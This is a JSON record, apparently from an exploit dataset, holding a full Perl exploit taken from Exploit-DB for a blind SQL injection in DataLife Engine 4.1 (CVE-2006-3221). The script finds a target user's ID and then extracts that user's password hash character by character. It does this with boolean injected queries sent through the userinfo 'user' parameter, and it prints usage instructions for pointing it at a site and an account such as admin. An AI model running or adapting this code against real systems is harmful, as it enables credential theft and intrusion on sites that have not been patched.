{
  "id": "1938",
  "title": "DataLife Engine 4.1 - SQL Injection",
  "cve": "CVE-2006-3221",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n## DataLife Engine sql injection exploit by RST/GHC\r\n## (c)oded by 1dt.w0lf\r\n## RST/GHC\r\n## http://rst.void.ru\r\n## http://ghc.ru\r\n## 18.06.06\r\n\r\nuse LWP::UserAgent;\r\nuse Getopt::Std;\r\n\r\ngetopts('u:n:p:');\r\n\r\n$url  = $opt_u;\r\n$name = $opt_n;\r\n$prefix = $opt_p || 'dle_';\r\n\r\nif(!$url || !$name) { &usage; }\r\n\r\n$s_num = 1;\r\n$|++;\r\n$n = 0;\r\n&head;\r\nprint \"\\r\\n\";\r\nprint \" [~]      URL : $url\\r\\n\";\r\nprint \" [~] USERNAME : $name\\r\\n\";\r\nprint \" [~]   PREFIX : $prefix\\r\\n\";\r\n$userid = 0;\r\nprint \" [~] GET USERID FOR USER \\\"$name\\\" ...\";\r\n$xpl = LWP::UserAgent->new() or die;\r\n$res = $xpl->get($url.'?subaction=userinfo&user='.$name);\r\nif($res->as_string =~ /do=lastcomments&userid=(\\d*)/) { $userid = $1; }\r\nelsif($res->as_string =~ /do=pm&doaction=newpm&user=(\\d*)/) { $userid = $1; }\r\nelsif($res->as_string =~ /do=feedback&user=(\\d*)/) { $userid = $1; }\r\nif($userid != 0 ) { print \" [ DONE ]\\r\\n\"; }\r\nelse { print \" [ FAILED ]\\r\\n\"; exit(); }\r\nprint \" [~]   USERID : $userid\\r\\n\";\r\n\r\nprint \" [~] SEARCHING PASSWORD ...  \";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,103); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n if(length($allchar) > 0){\r\n print qq{\\b  [ DONE ] \r\n ---------------------------------------------------------------\r\n  USERNAME : $name\r\n    USERID : $userid\r\n  PASSHASH : $allchar\r\n ---------------------------------------------------------------\r\n };\r\n }\r\n else\r\n {\r\n print \"\\b[ FAILED ]\";\r\n }\r\n exit();  \r\n }\r\nelse \r\n {  \r\n $allchar .= chr($char);\r\n print \"\\b\".chr($char).\" \";\r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \"/**/BETWEEN/**/$r/**/AND/**/$fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n status();\r\n $ccheck = $_[0]; \r\n $xpl = LWP::UserAgent->new() or die;\r\n $res = $xpl->get($url.'?subaction=userinfo&user='.$name.'%2527 and ascii(substring((SELECT password FROM '.$prefix.'users WHERE user_id='.$userid.'),'.$s_num.',1))'.$ccheck.'/*');\r\n if($res->as_string =~ /$name<\\/td>/) { return 1; }\r\n else { return 0; }\r\n }\r\n \r\nsub status()\r\n{\r\n  $status = $n % 5;\r\n  if($status==0){ print \"\\b/\";  }\r\n  if($status==1){ print \"\\b-\";  }\r\n  if($status==2){ print \"\\b\\\\\"; }\r\n  if($status==3){ print \"\\b|\";  }\r\n}\r\n\r\nsub usage()\r\n {\r\n &head;\r\n print q(\r\n  USAGE:\r\n  r57datalife.pl [OPTIONS]\r\n  \r\n  OPTIONS:\r\n  -u <URL>      - path to index.php\r\n  -n <USERNAME> - username for bruteforce\r\n  -p [prefix]   - database prefix\r\n  \r\n  E.G.\r\n  r57datalife.pl -u http://server/index.php -n admin\r\n ---------------------------------------------------------------\r\n (c)oded by 1dt.w0lf\r\n RST/GHC , http://rst.void.ru , http://ghc.ru\r\n );\r\n exit();\r\n }\r\nsub head()\r\n {\r\n print q(\r\n ---------------------------------------------------------------\r\n       DataLife Engine sql injection exploit by RST/GHC\r\n ---------------------------------------------------------------\r\n );\r\n }\r\n\r\n# milw0rm.com [2006-06-21]",
  "url": "https://www.exploit-db.com/exploits/1938"
}